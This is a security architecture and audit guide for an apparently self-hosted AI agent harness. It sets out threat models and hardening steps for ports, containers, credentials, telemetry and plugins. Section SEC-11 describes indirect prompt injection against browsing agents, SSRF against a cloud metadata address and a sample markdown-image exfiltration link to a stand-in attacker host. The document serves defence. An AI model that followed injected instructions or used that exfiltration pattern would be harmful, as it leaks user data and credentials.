# 🔒 Security Architecture & Security Audit

> 🏛️ **SOTA Specification**: For the 5-Pillar theoretical model, NIST AI RMF, and OWASP Top 10 for LLMs compliance mapping, see **[SOTA AI Harness Architecture](ai-harness-architecture-sota.md)**.

DeepSeek Harness within this Docker stack is designed with multi-layered defensive security controls to protect host files, sensitive credentials, and telemetry traces.

This document serves as both the **Security Architecture Guide** and the **Security Audit Reference**, tracking threat models, known risks, and hardening guidelines.

---

## 🛡️ Executive Summary & Security Posture

* **Overall Posture**: **GOOD** for local, single-developer environments; **REQUIRES SANDBOX OVERRIDE** when evaluating untrusted code or running multi-tenant hosts.
* **Network Isolation**: All exposed endpoints (`3080` for DSH Web UI, `6006` for Arize Phoenix) bind strictly to loopback (`127.0.0.1`), preventing external LAN/WAN network exposure.
* **Supply Chain Security**: Base images are pinned to immutable cryptographic digests (SHA256), eliminating image-tag mutability risks.
* **Data Sovereignty**: Observability (Arize Phoenix) runs 100% on-premise; no prompt traces or completion tokens egress to third-party cloud vendors.

---

## 📊 Vulnerability & Risk Matrix (Security Audit)

| ID | Category | Severity | Finding | Status / Remediation |
| :--- | :--- | :---: | :--- | :--- |
| **SEC-01** | **Access Control** | **HIGH** | Unauthenticated Web UI & Telemetry Endpoints | Mitigated on host network via loopback (`127.0.0.1`). Use reverse proxy with auth for remote access. |
| **SEC-02** | **Container Isolation** | **HIGH** | Default Container Runs as Root with Read-Write Host Mounts | Remediated via `docker-compose.sandbox.yml` (`cap_drop: ALL`, `:ro` mounts, `no-new-privileges`). |
| **SEC-03** | **Credential Security** | **MEDIUM** | API Keys Injected via Process Environment | Stored in memory / `/proc/1/environ`. Recommend restricted-scope keys and system prompt constraints. |
| **SEC-04** | **Least Privilege** | **MEDIUM** | GitHub MCP Server Blast Radius | Restrict GitHub Personal Access Tokens to fine-grained repository scopes. |
| **SEC-05** | **Data Privacy** | **LOW** | Full Prompt & Response Tracing in Phoenix Telemetry | 100% on-premise storage. Switch to `DSH_TELEMETRY_MODE=METRICS_ONLY` for sensitive datasets. |
| **SEC-06** | **Supply Chain** | **PASS** | Immutable SHA256 Image Digests & Safe Parser | Pinned base digests and regex-enforced `.env` variable loader prevent injection. |
| **SEC-07** | **Zero Trust RBAC** | **PASS** | Cross-Persona Escalation & Host Script Execution | Remediated via declarative `rbac:` contracts and transactional proxy blocking `reset.sh`/`install_dsh.sh` ([ADR 0001](adr/0001-build-time-immutability-and-rbac.md)). |
| **SEC-08** | **Immutability** | **PASS** | Runtime Monkey-Patching Configuration Drift | Remediated via build-time Docker patching; zero runtime mutation in `entrypoint.sh` ([ADR 0001](adr/0001-build-time-immutability-and-rbac.md)). |
| **SEC-09** | **Filesystem Boundaries** | **PASS** | Symlink Traversal Pivots & Directory Escape | Remediated via `canonicalizeWithAncestorRealpath()` and `checkSymlinkEscape()` in `config/rbac-policy.mjs` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
| **SEC-10** | **Execution Boundary** | **PASS** | Ambient Host Execution Fallback in CLI | Remediated via fail-closed in-container execution dispatch in `dsh.sh` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
| **SEC-11** | **Web Agent Confinement** | **PASS** | Indirect Prompt Injection & Cloud Metadata SSRF | Sanitized `mcp-fetch` text conversion, exfiltration stripping, and zero-egress sandbox profile. |

---

## 🔍 Detailed Audit Findings

### 1. [SEC-01] Access Control & Localhost Endpoints
* **Threat Model**:
  - DSH Web Workbench (`http://localhost:3080`) and Arize Phoenix (`http://localhost:6006`) do not implement multi-tenant enterprise authentication out of the box.
  - While recent upstream versions introduced single-user browser tokens, exposing these ports across `0.0.0.0` or public interfaces exposes the agent to DNS-rebinding, Cross-Site Request Forgery (CSRF), and unauthorized tool execution.
  - Any local untrusted process or malicious browser tab executing cross-origin requests on the host could interact with the agent or exfiltrate Arize Phoenix telemetry.
* **Hardening Guideline**:
  - **Loopback Enforcement**: In `docker-compose.yml`, both `3080` and `6006` are strictly bound to `127.0.0.1`, preventing exposure across local area networks (LAN) or public interfaces.
  - **Secure Remote Access**: If remote access is required, **never expose raw ports to the Internet**. Deploy an authenticated, encrypted transport layer such as **Tailscale**, **Cloudflare Access Tunnels**, or a reverse proxy (Caddy / Nginx) enforcing OAuth2/OIDC authentication.

### 2. [SEC-02] Process Privileges & Host Configuration Mount
* **Threat Model**:
  - Under standard `docker-compose.yml`, the container runs as `root` (UID 0) and mounts `./config` as read-write (`./config:/root/.dsh`).
  - If an untrusted agent prompt or rogue MCP tool executes arbitrary commands, host configuration files (`sync_models.mjs`, `doctor.mjs`, `cordis.patch.yml`) could be modified.
* **Hardening Guideline**:
  - **Always launch with the sandbox override when analyzing unverified repositories:**
    ```bash
    docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
    ```
  - In sandbox mode, `./config` is mounted read-only (`:ro`), root filesystem is read-only (`read_only: true`), all Linux capabilities are dropped (`cap_drop: [ALL]`), and runtime configuration is held in temporary memory (`tmpfs`).

### 3. [SEC-03] Credential Security in Container Environment
* **Threat Model**:
  - Sensitive frontier keys (`OPENROUTER_API_KEY`, `GEMINI_API_KEY`, `GITHUB_PERSONAL_ACCESS_TOKEN`) are injected into the container as environment variables.
  - Any shell tool or subprocess executed within the container can read `/proc/1/environ` or run `printenv`.
* **Hardening Guideline**:
  - The turnkey installer enforces `chmod 0600 $DSH_INSTALL/.env` to prevent unauthorized local file reads.
  - Avoid sharing execution logs or terminal sessions that output environment variables.
  - Configure spending quotas and rate limits on provider dashboards (OpenRouter FinOps / Google AI Studio).

### 4. [SEC-04] GitHub MCP Server Least Privilege
* **Threat Model**:
  - The official `github-mcp-server` has capabilities to create branches, push code, and update issues and PRs.
  - Supplying a classic GitHub PAT with full `repo` or `admin:org` scope grants the agent excessive write access across all your personal and organization repositories.
* **Hardening Guideline**:
  - Generate a **Fine-Grained Personal Access Token (Beta)** restricted to **Only select repositories**.
  - Grant only *Contents: Read and write* and *Pull requests: Read and write*. Deny repository administration, workflow management, and delete rights.

### 5. [SEC-05] Observability & Telemetry Retention (Data Sovereignty & Cloud APIs)
* **Threat Model**:
  - `DSH_TELEMETRY_MODE=FULL` streams entire multi-turn conversation transcripts, system prompts, tool call parameters, and model reasoning blocks into Arize Phoenix (`./config/phoenix`).
  - If processing confidential files or proprietary datasets, these artifacts persist in local SQLite/parquet databases.
* **Data Sovereignty Boundary & Cloud API Nuance**:
  - **Local Telemetry Invariant**: All telemetry data, span waterfalls, and GRC audit records (`audit_grc.jsonl`) remain 100% on-premise on the host machine. Unlike SaaS agent observability platforms (e.g., LangSmith, Datadog, AgentOps), zero trace data or prompt history is exported to external servers.
  - **Cloud Model API Egress**: When configured to use external cloud LLM providers (e.g. OpenRouter, DeepSeek API, Anthropic Claude, Google Gemini), prompts, file snippets, and tool outputs necessarily transit over TLS to the respective model provider's cloud inference endpoints.
  - **100% Air-Gapped Sovereign Alternative**: For regulated, defense, or high-compliance environments (GDPR Art. 9, HIPAA), pair DSH-DDS with local on-premise model backends (Ollama, vLLM, llama.cpp, LocalAI) or private VPC inference endpoints. Under this configuration, the entire agent lifecycle operates with **absolute zero data egress**.
* **Hardening Guideline**:
  - If processing sensitive or non-redactable code, configure in `.env`:
    ```env
    DSH_TELEMETRY_MODE=METRICS_ONLY
    ```
  - Periodically prune or wipe telemetry data:
    ```bash
    rm -rf config/phoenix/*
    ```

### 6. [SEC-07] Zero Trust Identity Isolation & Persona RBAC
* **Threat Model**:
  - Containerization isolates the Docker host from the container, but does not isolate personas from each other.
  - A prompt-injected or compromised persona (e.g. `data-analyst` handling untrusted CSV/SQL) could attempt to read credentials, mutate skills of `security-auditor`, or trigger administrative scripts (`reset.sh`, `install_dsh.sh`).
* **Hardening Guideline & Enforcement**:
  - Every persona manifest (`persona.yaml`) declares a strict `rbac:` policy specifying allowed roles, readable/writable filesystem paths, allowed MCP tools, and explicit `deny` paths.
  - The authoritative policy engine in `config/rbac-policy.mjs` (`enforceRbacPolicy()`) intercepts every workflow step prior to execution, performs directory containment checks (`isContainedWithin`), checks for escaping symlinks (`checkSymlinkEscape`), and fails closed if a target matches a deny pattern or exceeds authorization.
  - See [ADR 0001](adr/0001-build-time-immutability-and-rbac.md), [ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), and [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md).

### 7. [SEC-08] Build-Time Immutability vs. Runtime Monkey-Patching
* **Threat Model**:
  - Dynamically applying code patches in `docker/entrypoint.sh` at container startup introduces non-reproducibility, drift, and divergence between Git state and in-memory application state.
* **Hardening Guideline & Enforcement**:
  - All compatibility shims (`pi-ai` thought-signature preservation and `dsh-bash-local` Landlock auto-workdir creation) are compiled directly into the Docker image layers at build time (`RUN`).
  - `docker/entrypoint.sh` is strictly read-only regarding application code; zero dynamic string mutations or regex patchers execute at container boot.

### 8. [GRC-01] Immutable GRC Audit Trail (`audit_grc.jsonl`)
* **Governance Standard**:
  - Enterprise compliance frameworks (EU AI Act, SOC 2, ISO 27001) require verifiable audit trails of autonomous agent decisions.
  - Every authorization check is appended as a structured JSON Lines record to `/root/.dsh/sessions/audit_grc.jsonl`:
    ```json
    {
      "timestamp": "2026-09-03T01:32:22.185Z",
      "event_type": "GRC_AUTHORIZATION_DECISION",
      "persona": "data-analyst",
      "workflow": "analyze_pipeline",
      "step_index": 1,
      "step_name": "Profile Relational Datasets",
      "action": "inspect_sqlite",
      "target": "/workspaces/data.db",
      "decision": "GRANTED",
      "role": "data_analyst",
      "reason": "Policy validated"
    }
    ```

### 11. [SEC-11] Web Browsing Agents & External Data Ingestion Risks
* **Threat Model**:
  - Web-browsing agents (e.g., using `mcp-fetch` or web search tools) ingest untrusted external HTML/DOM, introducing **Indirect Prompt Injection** (malicious hidden instructions hijacking agent control flow).
  - An attacker could trick the agent into performing **Server-Side Request Forgery (SSRF)** against cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`) or private internal networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
  - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
* **Hardening Guideline & Mitigations**:
  - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
  - **Zero-Egress Isolation**: When auditing unverified third-party repositories or processing untrusted links, execute using `docker-compose.sandbox.yml` with `internal: true` to prevent network exfiltration.
  - **Host Loopback Protection**: Critical host services (DSH UI and Arize Phoenix) bind strictly to `127.0.0.1`, which is unreachable from within default Docker bridge containers without explicit routing.

---

## 🛡️ Hardened Sandbox Mode (`docker-compose.sandbox.yml`)

When using DSH to analyze external or unverified code repositories, start with the sandbox override:

```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
```

### Sandbox Protections Matrix

| Control | Standard Mode (`docker-compose.yml`) | Sandbox Mode (`sandbox.yml`) |
| :--- | :--- | :--- |
| **Root Filesystem** | Writable | **Read-Only (`read_only: true`)** |
| **Linux Capabilities** | Default Docker capabilities | **All Dropped (`cap_drop: ALL`)** |
| **Privilege Escalation** | Allowed | **Blocked (`no-new-privileges: true`)** |
| **Host Config Mount** | Read-Write (`./config:/root/.dsh`) | **Read-Only (`./config:/opt/dsh-config:ro`)** |
| **Workspace Mount** | Read-Write (`./workspaces`) | **Read-Only (`./workspaces:ro`)** |
| **Container Networking** | Bridge (Internet egress active) | **Zero-Egress Internal (`internal: true`)** |
| **Resource Constraints** | Unlimited | **Strict Limits (2 CPUs, 2GB RAM, 150 PIDs)** |
| **Configuration State** | Persisted on host | **Disposable `tmpfs` (reset on boot)** |

To destroy all transient sandbox session data:
```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml down -v
```

---

## ⚠️ Mandatory Plugin & Supply Chain Auditing Policy

Plugins and MCP tool servers in DeepSeek Harness execute directly within the Node.js container runtime with full access to mounted workspaces, environment variables, and system tools.

### Why Every Added Plugin Must Be Audited
* **In-Process Runtime Execution**: DSH plugins load as dynamic Node.js/Cordis modules. An unvetted or malicious plugin executes with the same privileges as the agent itself.
* **Credential Protection**: Although environment variables are protected from external network traffic, any in-process plugin can access `process.env` (including `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, and `GITHUB_PERSONAL_ACCESS_TOKEN`).
* **Supply Chain Attack Vectors**: Third-party npm packages can introduce compromised lifecycle scripts (`preinstall`, `postinstall`), unvetted transitive dependencies, or covert data-exfiltration logic.

### Pre-Installation Audit Checklist
Before adding any community plugin to `config/profiles/web/package.json` or installing via `dshmarket`:
1. **Source Code Inspection**: Review the plugin's source repository for obfuscated code, arbitrary `eval()`, or unexpected HTTP/WebSocket outbound connections.
2. **Lifecycle Scripts Verification**: Ensure the package's `package.json` does not declare suspicious `preinstall`, `install`, or `postinstall` hooks.
3. **Lockfile & Version Pinning**: Always pin strict versions in `package.json` and verify that dependencies resolve deterministically via `pnpm-lock.yaml`.
4. **Static Sandbox Policy**: When evaluating untrusted external code, never install new or unverified plugins dynamically; keep the plugin set minimal, fixed, and fully vetted.

---

## 📋 Security Best Practices Checklist

- [x] Ensure `.env` is never committed to Git (verified in `.gitignore`).
- [x] Keep `.env` permissions set to `0600` (`chmod 0600 .env`).
- [x] Use fine-grained GitHub PATs scoped strictly to individual repositories.
- [x] Enforce `docker-compose.sandbox.yml` when handling untrusted code or external inputs.
- [x] Thoroughly audit all third-party plugins and MCP servers before adding them to the environment.
- [x] Set spending caps on API provider accounts to prevent FinOps anomalies.
- [x] Run `./dsh.sh doctor` to regularly audit credentials, permissions, and network bindings.
